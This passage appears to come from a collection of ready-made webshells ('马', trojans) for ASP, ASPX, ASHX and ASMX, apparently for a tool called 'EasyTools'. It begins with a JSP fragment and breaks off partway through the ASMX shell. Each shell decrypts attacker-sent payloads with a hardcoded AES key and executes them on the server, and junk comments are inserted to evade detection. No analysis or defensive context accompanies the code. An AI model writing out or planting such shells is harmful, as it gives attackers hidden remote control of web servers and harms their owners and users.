response.getOutputStream().write(An3AW(ErL717RQ.toByteArray(), true));}} catch (Exception e) {response.sendError(404);}</hi:scriptlet>
</hi>

🚀【ASP马】
<%
Set A7bi2 = Server.CreateObject(\"Scripting.Dictionary\")

Function B0Fa6s(content,isBin)
    dim size,i,result,keySize
    keySize = len(key)
    Set CvjN = CreateObject(\"ADODB.Stream\")
    CvjN.CharSet = \"iso-8859-1\"
    CvjN.Type = 2
    CvjN.Open
    if IsArray(content) then
        size=UBound(content)+1
        For i=1 To size
            CvjN.WriteText chrw(ascb(midb(content,i,1)))
        Next
    end if
    CvjN.Position = 0
    if isBin then
        CvjN.Type = 1
        B0Fa6s=CvjN.Read()
    else
        B0Fa6s=CvjN.ReadText()
    end if

End Function
    content = request.BinaryRead(request.TotalBytes)
    if len(request.Cookies.Item(\"EasyTools\"))>0  then
        if  IsEmpty(Session(\"loadZ2S7\")) then
            content=B0Fa6s(content,false)
            Session(\"loadZ2S7\")=content
            response.End
        else
            A7bi2.Add \"loadZ2S7\",Session(\"loadZ2S7\")
            Execute(A7bi2(\"loadZ2S7\"))
            result=run(content)
            if not IsEmpty(result) then
                response.BinaryWrite result
            end if
        end if
    end if
%>

🚀【ASPX马】
<%try{string key = \"7d0f713061983844\";byte[] fileData = @Context.@Request.@BinaryRead(Context.Request.ContentLength);byte[] Kz27K29 = @System.@Text.@Encoding.@Default.@GetBytes(key);byte[] data = new @System.@Security.@Cryptography.@RijndaelManaged()./*Z#￥h*u@!h2810XC2k6*/@CreateDecryptor(Kz27K29, Kz27K29).@TransformFinalBlock(fileData, 0, Context.Request.ContentLength);if (Context.Session[\"loadzEfZ\"] == null){Type assemblyType = typeof(System.Reflection.Assembly);System.Reflection.MethodInfo loadMethod = assemblyType.GetMethod(\"Load\", new System.Type[] { typeof(byte[]) }); Context.Session[\"loadzEfZ\"] = (@System.@Reflection.@Assembly)loadMethod.Invoke(null, new object[] { data });}else{ object o = ((@System.@Reflection.@Assembly)Context.Session[\"loadzEfZ\"]).@CreateInstance(\"LY\"); System.IO.MemoryStream outStream = new @System.@IO.@MemoryStream();o.Equals(/*Z#￥h*u@!h2810XC2k6*/outStream);o.Equals(/*Z#￥h*u@!h2810XC2k6*/Context); o.Equals(/*Z#￥h*u@!h2810XC2k6*/data);o.ToString();byte[] r = outStream.ToArray();outStream.Dispose();@Context.@Response.@BinaryWrite(new @System.@Security.@Cryptography.@RijndaelManaged()./*Z#￥h*u@!h2810XC2k6*/@CreateEncryptor(Kz27K29, Kz27K29).@TransformFinalBlock(r, 0, r.Length));}}catch(System.Exception){}%><%@ Page Language = \"CS\"%>

🚀【ASHX马】
<%@ WebHandler Language = \"CS\" Class=\"Handler3\" %>public class Handler3 : System.Web.IHttpHandler,System.Web.SessionState.IRequiresSessionState{public void ProcessRequest(System.Web.HttpContext Context){try{string key = \"7d0f713061983844\";byte[] fileData = Context.Request.BinaryRead(Context.Request.ContentLength);byte[] KDMykZz = System.Text.Encoding.Default.GetBytes(key);byte[] data = new System.Security.Cryptography.RijndaelManaged()./*Z#￥h*u@!hiaIR646X5*/@CreateDecryptor(KDMykZz, KDMykZz).TransformFinalBlock(fileData, 0, Context.Request.ContentLength);if (Context.Session[\"loadux83\"] == null){Type assemblyType = typeof(System.Reflection.Assembly);System.Reflection.MethodInfo loadMethod = assemblyType.GetMethod(\"Load\", new System.Type[] { typeof(byte[]) }); Context.Session[\"loadux83\"] = (System.Reflection.Assembly)loadMethod.Invoke(null, new object[] { data });}else{ object o = ((System.Reflection.Assembly)Context.Session[\"loadux83\"]).CreateInstance(\"LY\"); System.IO.MemoryStream outStream = new System.IO.MemoryStream();o.Equals(/*Z#￥h*u@!hiaIR646X5*/@outStream);o.Equals(/*Z#￥h*u@!hiaIR646X5*/@Context); o.Equals(/*Z#￥h*u@!hiaIR646X5*/@data);o.ToString();byte[] r = outStream.ToArray();outStream.Dispose();Context.Response.BinaryWrite(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(KDMykZz, KDMykZz).TransformFinalBlock(r, 0, r.Length));}}catch(System.Exception){}}public bool IsReusable{get{return false;}}}

🚀【ASMX马】
<%@ WebService Language = \"CS\" Class=\"WebServicetest\" %> public class WebServicetest : System.Web.Services.WebService { [System.Web.Services.WebMethod(EnableSession = true)] public string EasyTools(string EasyTools) {System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder(); try { string key = \"7d0f713061983844\"; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(\"EasyTools\" + key))).Replace(\"-\", \"\");byte[] data = System.Convert.FromBase64String(System.Web.HttpUtility.UrlDecode(EasyTools));System.Security.Cryptography.RijndaelManaged rijndael = new System.Security.Cryptography.RijndaelManaged();byte[] keyBytes = System.Text.Encoding.Default.GetBytes(key);data = rijndael./*Z#￥h*u@!hgv2935Gx5*/@CreateDecryptor(keyBytes, keyBytes).TransformFinalBlock(data, 0, data.Length);if (Context.Session[\"loadAS69\"] == null) { Type assemblyType = typeof(System.Reflection.Assembly);System.Reflection.MethodInfo loadMethod = assemblyType.GetMethod(\"Load\", new System.Type[] { typeof(byte[]) });Context.Session[\"loadAS69\"] = (System.Reflection.Assembly)loadMethod.Invoke(null, new object[] { data });} else { object o = ((System.Reflection.Assembly)Context.Session[\"loadAS69\"]).CreateInstance(\"LY\"); System.IO.MemoryStream outStream = new System.IO.MemoryStream(); o.Equals(/*Z#￥h*u@!hgv2935Gx5*/@outStream);o.Equals(/*Z#￥h*u@!hgv2935Gx5*/@Context);  o.Equals(/*Z#￥h*u@!hgv2935Gx5*/@data); o.ToString(); byte[] r = outStream.ToArray(); stringBuilder.Append(md5.Substring(0, 16)); stringBuilder.Append(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length)));stringBuilder.Append(md5.Substring(16)); } } catch (System.Exception) { } return stringBuilder.ToString(); 
~~~